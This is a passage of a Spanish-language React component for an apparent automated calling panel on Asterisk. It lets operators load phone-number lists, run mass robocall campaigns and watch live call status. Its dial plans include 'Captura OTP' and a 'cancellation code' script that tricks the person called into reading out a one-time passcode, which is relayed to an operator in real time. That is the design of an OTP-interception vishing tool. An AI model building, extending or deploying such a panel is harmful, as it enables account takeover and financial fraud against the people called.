                accept=".txt,.csv,.text"
                className="hidden"
                onChange={(e) => {
                  if (e.target.files && e.target.files[0]) {
                    handleFileUpload(e.target.files[0]);
                  }
                }}
              />

              {/* Zona de Arrastrar y Soltar o Cargar Archivo .txt / .csv */}
              <div
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onDrop={handleDrop}
                onClick={() => !isMassRunning && fileInputRef.current?.click()}
                className={`border-2 border-dashed rounded-xl p-3 sm:p-4 text-center transition-all cursor-pointer ${
                  isDraggingFile
                    ? 'border-purple-400 bg-purple-950/40 ring-2 ring-purple-500/50'
                    : 'border-slate-700/80 hover:border-purple-500/70 bg-slate-900/40 hover:bg-slate-900/70'
                } ${isMassRunning ? 'opacity-50 cursor-not-allowed' : ''}`}
                title="Haz clic o arrastra un archivo .txt o .csv con números telefónicos"
              >
                <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
                  <div className="flex items-center gap-3 text-left">
                    <div className="p-2.5 rounded-xl bg-purple-500/20 text-purple-300 shrink-0">
                      <Upload className="w-5 h-5 text-purple-400" />
                    </div>
                    <div>
                      <div className="text-xs font-bold text-white flex items-center gap-2">
                        <span>Cargar Lista desde Archivo de Texto</span>
                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-300 font-mono font-bold">
                          .TXT / .CSV
                        </span>
                      </div>
                      <p className="text-[11px] text-slate-400 mt-0.5">
                        Arrastra tu archivo aquí o haz clic para seleccionarlo. Filtra y desduplica automáticamente.
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      if (!isMassRunning) fileInputRef.current?.click();
                    }}
                    disabled={isMassRunning}
                    className="shrink-0 px-3.5 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold flex items-center gap-1.5 shadow-md shadow-purple-600/30 transition-all cursor-pointer disabled:opacity-50"
                  >
                    <Upload className="w-3.5 h-3.5" />
                    <span>Subir Archivo .txt</span>
                  </button>
                </div>
              </div>

              {/* Banner de archivo cargado */}
              {uploadedFileName && (
                <div className="flex items-center justify-between px-3.5 py-2 rounded-xl bg-purple-950/40 border border-purple-500/40 text-xs">
                  <span className="flex items-center gap-2 text-purple-200">
                    <FileText className="w-4 h-4 text-purple-400 shrink-0" />
                    <span>
                      Archivo cargado: <strong className="text-white font-mono">{uploadedFileName}</strong>
                    </span>
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setUploadedFileName(null);
                      setMassNumbersText('');
                    }}
                    className="text-[11px] font-bold text-slate-400 hover:text-rose-400 transition-colors"
                  >
                    Quitar archivo
                  </button>
                </div>
              )}

              {/* Feedback de carga de archivo */}
              {uploadedFileFeedback && (
                <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 shrink-0 text-emerald-400" />
                  <span>{uploadedFileFeedback}</span>
                </div>
              )}

              {/* Recordatorio de cola dinámica: números desaparecen al marcar */}
              <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-900/70 border border-slate-800 text-[11px] text-purple-300">
                <Sparkles className="w-3.5 h-3.5 text-purple-400 shrink-0" />
                <span>
                  <strong>Cola dinámica en vivo:</strong> A medida que los números se van marcando,{' '}
                  <span className="text-white font-semibold">van desapareciendo de esta lista</span> para que siempre sepas cuáles faltan por emitir.
                </span>
              </div>

              <textarea
                id="textarea-mass-numbers"
                rows={7}
                value={massNumbersText}
                onChange={(e) => setMassNumbersText(e.target.value)}
                disabled={isMassRunning}
                placeholder="Pega aquí los números (uno por línea o separados por coma):&#10;16104803845&#10;18005550199&#10;18295551234"
                className="w-full p-4 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-sm focus:border-purple-500 focus:outline-none transition-all disabled:opacity-50"
              />

              <div className="flex flex-wrap items-center justify-between gap-3 pt-2">
                <div className="flex items-center gap-2">
                  {isSuperAdmin && (
                    <button
                      type="button"
                      onClick={() => {
                        setUploadedFileName(null);
                        setMassNumbersText('16104803845\n18005550199\n18099602110');
                      }}
                      disabled={isMassRunning}
                      className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 text-xs font-semibold border border-slate-800 transition-all cursor-pointer disabled:opacity-50"
                    >
                      Números de Prueba
                    </button>
                  )}
                  <button
                    type="button"
                    onClick={() => {
                      setUploadedFileName(null);
                      setMassNumbersText('');
                    }}
                    disabled={isMassRunning}
                    className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-400 text-xs border border-slate-800 transition-all cursor-pointer disabled:opacity-50"
                  >
                    Limpiar Lista
                  </button>
                </div>

                <div className="flex items-center gap-2">
                  <label className="text-xs text-slate-400 font-mono">Intervalo entre llamadas:</label>
                  <select
                    value={massDelaySeconds}
                    onChange={(e) => setMassDelaySeconds(Number(e.target.value))}
                    disabled={isMassRunning}
                    className="px-2 py-1 bg-slate-900 border border-slate-700 rounded-lg text-xs text-purple-300 font-mono font-bold focus:outline-none"
                  >
                    <option value={2}>2 segundos</option>
                    <option value={5}>5 segundos</option>
                    <option value={10}>10 segundos</option>
                    <option value={15}>15 segundos</option>
                  </select>
                </div>
              </div>

              {/* Botones de acción masiva */}
              <div className="pt-4 flex flex-wrap items-center gap-3">
                {!isMassRunning ? (
                  <button
                    id="btn-start-mass-campaign"
                    type="button"
                    onClick={handleStartMassCampaign}
                    className="flex-1 min-w-[240px] py-3.5 px-6 rounded-xl font-black text-xs uppercase tracking-wider bg-gradient-to-r from-purple-500 via-indigo-500 to-purple-600 hover:from-purple-400 hover:to-indigo-400 text-white shadow-xl shadow-purple-500/25 flex items-center justify-center gap-2 transition-all cursor-pointer active:scale-[0.99]"
                  >
                    <Play className="w-4 h-4 fill-white" />
                    <span>INICIAR CAMPAÑA MASIVA (RING-ALL)</span>
                  </button>
                ) : (
                  <button
                    id="btn-stop-mass-campaign"
                    type="button"
                    onClick={handleStopMassCampaign}
                    className="flex-1 min-w-[200px] py-3.5 px-6 rounded-xl font-black text-xs uppercase tracking-wider bg-amber-600 hover:bg-amber-500 text-white shadow-xl shadow-amber-600/30 flex items-center justify-center gap-2 transition-all cursor-pointer animate-pulse"
                  >
                    <Square className="w-4 h-4 fill-white" />
                    <span>PAUSAR COLA EN CURSO</span>
                  </button>
                )}

                <button
                  id="btn-mass-hangup-all"
                  type="button"
                  onClick={handleHangupAllMassCalls}
                  disabled={isHangingUpAllMass}
                  className="py-3.5 px-5 rounded-xl font-black text-xs uppercase tracking-wider bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white shadow-xl shadow-rose-600/30 border border-rose-400/40 flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50"
                  title="Colgar de inmediato todas las llamadas activas en curso en Asterisk"
                >
                  <PhoneOff className="w-4 h-4" />
                  <span>{isHangingUpAllMass ? 'COLGANDO...' : 'COLGAR TODAS LAS LLAMADAS'}</span>
                </button>
              </div>
            </div>

            {/* Parámetros de la campaña masiva */}
            <div className="space-y-4 p-6 rounded-2xl bg-slate-950 border border-slate-800">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <Sliders className="w-4 h-4 text-purple-400" />
                <span>Configuración de Difusión</span>
              </h4>

              <div className="space-y-3 text-xs">
                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-400 font-mono font-bold mb-1 flex items-center justify-between">
                    <span>{isSuperAdmin ? 'Troncal SIP Saliente' : 'Ruta Saliente (Asignada por Admin)'}</span>
                    {!isSuperAdmin && (
                      <span className="inline-flex items-center gap-1 text-[9px] font-bold text-amber-300 bg-amber-500/15 border border-amber-500/30 px-1.5 py-0.5 rounded">
                        <Lock className="w-2.5 h-2.5" />
                        Fija
                      </span>
                    )}
                  </div>
                  {isSuperAdmin ? (
                    <select
                      value={selectedCarrierName}
                      onChange={(e) => setSelectedCarrierName(e.target.value)}
                      disabled={isMassRunning}
                      className="w-full bg-slate-950 border border-slate-700 hover:border-emerald-500 rounded px-2.5 py-1.5 text-xs text-emerald-400 font-mono font-bold focus:outline-none cursor-pointer"
                    >
                      <option value="auto">🔄 Pool Automático (Multi-Carrier Failover)</option>
                      {enabledCarriers.map((c) => (
                        <option key={c.id} value={c.name}>
                          {`${c.name} (${c.host})`}
                        </option>
                      ))}
                    </select>
                  ) : (
                    <div
                      className="w-full bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 text-xs text-emerald-400 font-mono font-bold flex items-center gap-1.5"
                      title="Los clientes no pueden cambiar de carrier"
                    >
                      <Lock className="w-3 h-3 text-amber-400 shrink-0" />
                      <span>⭐ {activeCarrier}</span>
                    </div>
                  )}
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-400 font-mono font-bold mb-1">Guión / Audio IVR</div>
                  <select
                    value={selectedService}
                    onChange={(e) => setSelectedService(e.target.value as ServiceCampaignKey)}
                    disabled={isMassRunning || visibleCampaignEntities.length === 0}
                    className="w-full bg-slate-950 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-sky-400 font-bold focus:outline-none"
                  >
                    {visibleCampaignEntities.length === 0 ? (
                      <option value="">Sin guiones asignados</option>
                    ) : (
                      visibleCampaignEntities.map((ent) => (
                        <option key={ent.id} value={ent.id}>
                          {ent.name} ({ent.subtitle})
                        </option>
                      ))
                    )}
                  </select>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between gap-2">
                    <div className="text-[10px] text-slate-400 font-mono font-bold">Plan de Marcación (Modo IVR)</div>
                    {!isSuperAdmin && (
                      <span className="inline-flex items-center gap-1 text-[9px] font-bold text-amber-300 bg-amber-500/15 border border-amber-500/30 px-1.5 py-0.5 rounded">
                        <Lock className="w-2.5 h-2.5" />
                        Solo Admin
                      </span>
                    )}
                  </div>
                  <div className="grid grid-cols-2 gap-1.5">
                    {[
                      { id: 'otp' as CallFlowMode, label: '1. Captura OTP' },
                      { id: 'press1' as CallFlowMode, label: '2. Press-1 Asesor' },
                      { id: 'hybrid' as CallFlowMode, label: '3. Híbrido' },
                      { id: 'cancel_code' as CallFlowMode, label: '4. Cód. Cancelación' },
                    ].map((opt) => {
                      const isAllowed = isSuperAdmin || adminAllowedCallFlowModes.includes(opt.id);
                      return (
                        <button
                          key={opt.id}
                          type="button"
                          disabled={isMassRunning || !isAllowed}
                          onClick={() => setCallFlowMode(opt.id)}
                          title={!isAllowed ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
                          className={`px-2 py-1.5 rounded-lg text-[11px] font-bold border text-left transition-all flex items-center justify-between gap-1 ${
                            callFlowMode === opt.id
                              ? opt.id === 'cancel_code'
                                ? 'bg-amber-500/20 border-amber-400 text-amber-200 cursor-pointer'
                                : 'bg-purple-500/20 border-purple-400 text-white cursor-pointer'
                              : !isAllowed
                              ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
                              : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white cursor-pointer disabled:opacity-50'
                          }`}
                        >
                          <span className="truncate">{opt.label}</span>
                          {!isAllowed && <Lock className="w-2.5 h-2.5 text-slate-500 shrink-0" />}
                        </button>
                      );
                    })}
                  </div>
                  {callFlowMode === 'cancel_code' && (
                    <div className="text-[10px] text-amber-300 bg-amber-950/30 border border-amber-500/30 rounded px-2 py-1.5">
                      Al marcar <strong>1</strong> dirá: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y el agente validará Válido / Inválido.
                    </div>
                  )}
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-purple-500/30 bg-purple-950/20">
                  <div className="text-[10px] text-purple-300 font-mono font-bold">Destino al Presionar 1 (Difusión)</div>
                  <div className="text-xs font-bold text-white mt-1">
                    {agentExtension === 'ringall'
                      ? `⚡ Cacería Ring-All (${userTenant ? userTenant.name : 'Extensiones del Centro'})`
                      : `👤 Extensión Específica: ${agentExtension}`}
                  </div>
                  <p className="text-[11px] text-slate-300 mt-1 leading-relaxed">
                    {callFlowMode === 'cancel_code'
                      ? 'En modo Código de Cancelación, al marcar 1 el cliente escucha el mensaje de envío de código y digita el código para que el agente lo apruebe o rechace.'
                      : agentExtension === 'ringall'
                      ? `Suenan al mismo tiempo únicamente las extensiones asignadas (${tenantScopedExtensions.join(', ')}). La extensión que conteste la llamada queda registrada automáticamente para el retorno exclusivo de su código OTP.`
                      : `La llamada irá directamente a la extensión ${agentExtension}.`}
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Registro y Progreso en Vivo de la Campaña Masiva con Filtros En Línea / Hold / Colgadas */}
          {massLog.length > 0 && (() => {
            const massInLineCount = massLog.filter((m) => m.status === 'in_line' || m.status === 'success').length;
            const massOnHoldCount = massLog.filter((m) => m.status === 'on_hold').length;
            const massEndedCount = massLog.filter((m) => m.status === 'ended' || m.status === 'failed').length;
            const massMachineCount = massLog.filter((m) => m.status === 'machine_detected').length;

            const filteredMassLog = massLog.filter((m) => {
              if (massFilter === 'in_line') return m.status === 'in_line' || m.status === 'success';
              if (massFilter === 'on_hold') return m.status === 'on_hold';
              if (massFilter === 'ended') return m.status === 'ended' || m.status === 'failed';
              if (massFilter === 'machine') return m.status === 'machine_detected';
              return true;
            });

            return (
              <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
                  <div>
                    <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                      <Radio className="w-4 h-4 text-purple-400" />
                      <span>Progreso de Emisión Masiva</span>
                      <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-purple-500/20 text-purple-300">
                        {massCurrentIndex} / {massTotalCount} Procesados
                      </span>
                    </h4>
                    <p className="text-[11px] text-slate-400 mt-0.5">
                      Visualiza en tiempo real cuáles llamadas están en línea con los clientes, cuáles están en Hold o cuáles fueron colgadas.
                    </p>
                  </div>

                  {isMassRunning && (
                    <div className="flex items-center gap-2">
                      <span className="flex items-center gap-2 text-xs font-mono text-purple-400 bg-purple-950/30 px-3 py-1.5 rounded-xl border border-purple-500/30">
                        <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        <span>Marcando: {massActiveNumber}</span>
                      </span>
                    </div>
                  )}
                </div>

                {/* Filtros de Estado: Todas, En Línea, En Hold, Colgadas, Grabadora */}
                <div className="flex flex-wrap items-center gap-2 pt-1 border-t border-slate-800">
                  <button
                    type="button"
                    onClick={() => setMassFilter('all')}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
                      massFilter === 'all'
                        ? 'bg-purple-600 text-white shadow'
                        : 'bg-slate-900 text-slate-400 hover:text-white border border-slate-800'
                    }`}
                  >
                    Todas ({massLog.length})
                  </button>

                  <button
                    type="button"
                    onClick={() => setMassFilter('in_line')}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all ${
                      massFilter === 'in_line'
                        ? 'bg-emerald-600 text-white shadow'
                        : 'bg-slate-900 text-emerald-400 hover:bg-slate-800 border border-slate-800'
                    }`}
                  >
                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                    <span>En Línea ({massInLineCount})</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setMassFilter('on_hold')}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all ${
                      massFilter === 'on_hold'
                        ? 'bg-amber-600 text-white shadow'
                        : 'bg-slate-900 text-amber-400 hover:bg-slate-800 border border-slate-800'
                    }`}
                  >
                    <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                    <span>En Hold ({massOnHoldCount})</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setMassFilter('ended')}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all ${
                      massFilter === 'ended'
                        ? 'bg-rose-600 text-white shadow'
                        : 'bg-slate-900 text-rose-400 hover:bg-slate-800 border border-slate-800'
                    }`}
                  >
                    <PhoneOff className="w-3 h-3" />
                    <span>Colgadas ({massEndedCount})</span>
                  </button>

                  {massMachineCount > 0 && (
                    <button
                      type="button"
                      onClick={() => setMassFilter('machine')}
                      className={`px-3 py-1.5 rounded-lg text-xs font-bold flex items-center gap-1.5 transition-all ${
                        massFilter === 'machine'
                          ? 'bg-purple-700 text-white shadow'
                          : 'bg-slate-900 text-purple-300 hover:bg-slate-800 border border-slate-800'
                      }`}
                    >
                      <span>🤖 Operadora / Reintento ({massMachineCount})</span>
                    </button>
                  )}
                </div>

                {/* Barra de progreso */}
                <div className="w-full bg-slate-900 h-2.5 rounded-full overflow-hidden border border-slate-800">
                  <div
                    className="bg-gradient-to-r from-purple-500 to-emerald-400 h-full transition-all duration-300"
                    style={{ width: `${massTotalCount > 0 ? (massCurrentIndex / massTotalCount) * 100 : 0}%` }}
                  />
                </div>

                {/* Lista de números con estados en tiempo real y botón individual para colgar */}
                <div className="max-h-72 overflow-y-auto space-y-2 font-mono text-xs pr-1">
                  {filteredMassLog.length === 0 ? (
                    <div className="py-6 text-center text-slate-500 italic">
                      No hay llamadas con el filtro "{massFilter === 'in_line' ? 'En Línea' : massFilter === 'on_hold' ? 'En Hold' : massFilter === 'ended' ? 'Colgadas' : 'Operadora'}"
                    </div>
                  ) : (
                    filteredMassLog.map((item, idx) => {
                      const isInLine = item.status === 'in_line' || item.status === 'success';
                      const isOnHold = item.status === 'on_hold';
                      const isEnded = item.status === 'ended' || item.status === 'failed';
                      const isMachine = item.status === 'machine_detected';
                      const isCalling = item.status === 'calling';

                      return (
                        <div
                          key={idx}
                          className={`p-3.5 rounded-xl border flex flex-col md:flex-row md:items-center justify-between gap-3 transition-all ${
                            isOnHold
                              ? 'bg-amber-950/30 border-amber-500/50 text-amber-200 shadow-sm shadow-amber-500/10'
                              : isInLine
                              ? 'bg-emerald-950/30 border-emerald-500/50 text-emerald-200 shadow-sm shadow-emerald-500/10'
                              : isMachine
                              ? 'bg-purple-950/40 border-purple-500/50 text-purple-200'
                              : isCalling
                              ? 'bg-purple-950/30 border-purple-500/40 text-purple-200'
                              : isEnded
                              ? 'bg-slate-900/60 border-slate-800 text-slate-400'
                              : 'bg-slate-900/40 border-slate-800 text-slate-400'
                          }`}
                        >
                          {/* Columna Izquierda: Índice, Número, Tiempo y Detalle de la Llamada */}
                          <div className="flex items-start sm:items-center gap-3 min-w-0">
                            <span className="text-[10px] text-slate-500 w-6 shrink-0 mt-0.5 sm:mt-0 font-mono">
                              #{idx + 1}
                            </span>

                            <div className="space-y-1 min-w-0">
                              <div className="flex flex-wrap items-center gap-2">
                                {/* Número Telefónico */}
                                <div className="font-bold text-white tracking-wider flex items-center gap-1.5 font-mono text-sm">
                                  <Phone className="w-3.5 h-3.5 text-purple-400 shrink-0" />
                                  <span>{item.number}</span>
                                </div>

                                {/* Cronómetro en Vivo de la Llamada */}
                                <div
                                  className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md font-mono text-xs font-bold ${
                                    !isEnded
                                      ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 shadow-inner'
                                      : 'bg-slate-800/80 text-slate-400 border border-slate-700'
                                  }`}
                                  title="Duración de la llamada"
                                >
                                  <Clock
                                    className={`w-3.5 h-3.5 ${
                                      !isEnded ? 'text-emerald-400 animate-pulse' : 'text-slate-500'
                                    }`}
                                  />
                                  <span>⏱ {formatTime(item.duration || 0)}</span>
                                </div>

                                {/* Extensión que está atendiendo la llamada */}
                                {item.agent && item.agent !== 'ringall' && item.agent !== 'all' ? (
                                  <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md text-[11px] font-bold bg-sky-500/20 text-sky-200 border border-sky-500/40 shadow-sm">
                                    <UserCheck className="w-3.5 h-3.5 text-sky-400 shrink-0" />
                                    <span>
                                      Atendiendo:{' '}
                                      <strong className="text-white font-mono">Ext. {item.agent}</strong>
                                      {item.agentName && item.agentName !== item.agent && !item.agentName.includes('Ext.')
                                        ? ` (${item.agentName})`
                                        : ''}
                                    </span>
                                  </span>
                                ) : (
                                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[11px] font-medium bg-purple-500/15 text-purple-300 border border-purple-500/30">
                                    <Users className="w-3.5 h-3.5 text-purple-400 shrink-0" />
                                    <span>
                                      {isEnded
                                        ? 'Difusión Ring-All'
                                        : '⚡ Ring-All (Todas las Extensiones)'}
                                    </span>
                                  </span>
                                )}
                              </div>

                              {/* Cómo va la llamada (Detalle y Mensaje de estado) */}
                              <div className="text-[11px] text-slate-300 truncate max-w-xl flex items-center gap-1.5">
                                {item.statusDetail && (
                                  <span className="font-semibold text-white/90">
                                    {item.statusDetail} —
                                  </span>
                                )}
                                <span className="opacity-80 truncate">{item.msg}</span>
                              </div>
                            </div>
                          </div>

                          {/* Columna Derecha: Hora, Badge de Estado y Botón de Colgar */}
                          <div className="flex items-center gap-2 shrink-0 self-end md:self-auto">
                            <span className="text-[10px] text-slate-500 font-mono">{item.time}</span>

                            {/* Badge de Estado Específico */}
                            <span
                              className={`px-2.5 py-1 rounded-full text-[10px] font-black uppercase tracking-wider flex items-center gap-1 ${
                                isOnHold
                                  ? 'bg-amber-500 text-slate-950 animate-pulse'
                                  : isInLine
                                  ? 'bg-emerald-500 text-slate-950 font-bold'
                                  : isMachine
                                  ? 'bg-purple-600 text-white'
                                  : isCalling
                                  ? 'bg-purple-500/30 text-purple-300 border border-purple-500/40 animate-pulse'
                                  : isEnded
                                  ? 'bg-slate-800 text-slate-400 border border-slate-700'
                                  : 'bg-slate-800 text-slate-400'
                              }`}
                            >
                              {isOnHold ? (
                                <>
                                  <span className="w-1.5 h-1.5 rounded-full bg-slate-950 animate-ping" />
                                  <span>EN HOLD</span>
                                </>
                              ) : isInLine ? (
                                <>
                                  <span className="w-1.5 h-1.5 rounded-full bg-slate-950 animate-ping" />
                                  <span>EN LÍNEA</span>
                                </>
                              ) : isMachine ? (
                                <span>🤖 OPERADORA</span>
                              ) : isCalling ? (
                                <span>MARCANDO</span>
                              ) : isEnded ? (
                                <span>COLGADA</span>
                              ) : (
                                <span>EN COLA</span>
                              )}
                            </span>

                            {/* Botón individual de Colgar para cada llamada activa o en espera */}
                            {(isInLine || isOnHold || isCalling || isMachine) && (
                              <button
                                type="button"
                                onClick={() => handleHangupSpecificMassCall(item.number, item.channel)}
                                className="px-2.5 py-1 rounded-lg text-[10px] font-bold bg-rose-600/30 hover:bg-rose-600 text-rose-200 border border-rose-500/40 flex items-center gap-1 transition-all cursor-pointer"
                                title="Colgar esta llamada de inmediato"
                              >
                                <PhoneOff className="w-3 h-3" />
                                <span>Colgar</span>
                              </button>
                            )}
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            );
          })()}
        </div>
      )}

      {/* ======================================================== */}
      {/* PESTAÑA DEDICADA: ACCIÓN DEL IVR AL CONTESTAR (ESPACIO EXPANDIDO) */}
      {/* ======================================================== */}
      {isSuperAdmin && productionMode === 'ivr_action' && (
        <div className="space-y-6">
          {/* Header Banner con Acciones Rápidas */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                  <Zap className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center gap-2">
                    <span>Acción del IVR al Contestar</span>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                      {callFlowMode === 'otp'
                        ? 'Modo OTP Activo'
                        : callFlowMode === 'press1'
                        ? 'Modo Press-1 Activo'
                        : callFlowMode === 'cancel_code'
                        ? 'Modo Press-1 + Cancelación Activo'
                        : 'Modo Híbrido Activo'}
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Configuración de espacio amplio: define exactamente cómo responderá Asterisk, qué locuciones reproducirá y cómo capturará los datos al descolgar la llamada.
                  </p>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2.5">
              <button
                type="button"
                onClick={() => setProductionMode('single')}
                className="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 text-xs font-bold flex items-center gap-1.5 transition-all shadow-sm"
              >
                <span>← Volver al Disparador Individual</span>
              </button>

              <button
                type="button"
                onClick={() => handleSyncAudiosToAsterisk(false)}
                disabled={isSyncingAudios}
                className="px-4 py-2 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-2 transition-all shadow-sm"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isSyncingAudios ? 'animate-spin' : ''}`} />
                <span>{isSyncingAudios ? 'Sincronizando...' : 'Sincronizar Audios con Asterisk'}</span>
              </button>
            </div>
          </div>

          {/* Feedback de Sincronización */}
          {audioSyncFeedback && (
            <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs font-semibold flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{audioSyncFeedback}</span>
            </div>
          )}

          {/* Selector de Modos de Flujo en Pestañas Grandes */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Sliders className="w-4 h-4 text-emerald-400" />
                  <span>1. Selecciona la Acción Principal del IVR</span>
                </h4>
                <p className="text-xs text-slate-400">
                  Elige qué lógica se ejecutará automáticamente en Asterisk una vez que el destino conteste.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              {/* Opción Principal: Press-1 + Código de Cancelación */}
              <button
                type="button"
                onClick={() => setCallFlowMode('cancel_code')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'cancel_code'
                    ? 'bg-amber-500/15 border-amber-400 text-white shadow-xl shadow-amber-500/15 ring-2 ring-amber-400/70'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-amber-500/40'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-amber-500/20 text-amber-400">
                    <ShieldCheck className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'cancel_code' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-400 text-slate-950">
                      PRINCIPAL ACTIVO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-amber-400 font-bold">PRINCIPAL</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">1. Press-1 + Código Cancelación</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Al marcar 1 reproduce: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em>, te <strong>avisa al instante</strong> para que envíes el código y espera a que confirmes para pedirle que lo digite.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-amber-400/95 font-mono">
                  ✓ Alerta en vivo + Envío guiado + Válido/Inválido
                </div>
              </button>

              {/* Opción 2: Captura OTP */}
              <button
                type="button"
                onClick={() => setCallFlowMode('otp')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'otp'
                    ? 'bg-emerald-500/15 border-emerald-500 text-white shadow-xl shadow-emerald-500/10 ring-2 ring-emerald-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400">
                    <KeyRound className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'otp' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 2</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">2. Capturar Código OTP</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Reproduce la locución de verificación y solicita al cliente ingresar su código de confirmación o clave OTP de 4 o 6 dígitos en el teclado.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-emerald-400/90 font-mono">
                  ✓ Reflejo inmediato en pantalla en tiempo real
                </div>
              </button>

              {/* Opción 3: Press-1 */}
              <button
                type="button"
                onClick={() => setCallFlowMode('press1')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'press1'
                    ? 'bg-sky-500/15 border-sky-500 text-white shadow-xl shadow-sky-500/10 ring-2 ring-sky-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-sky-500/20 text-sky-400">
                    <PhoneForwarded className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'press1' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-sky-400 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 3</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">3. Press-1 (Transferir a Softphone)</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
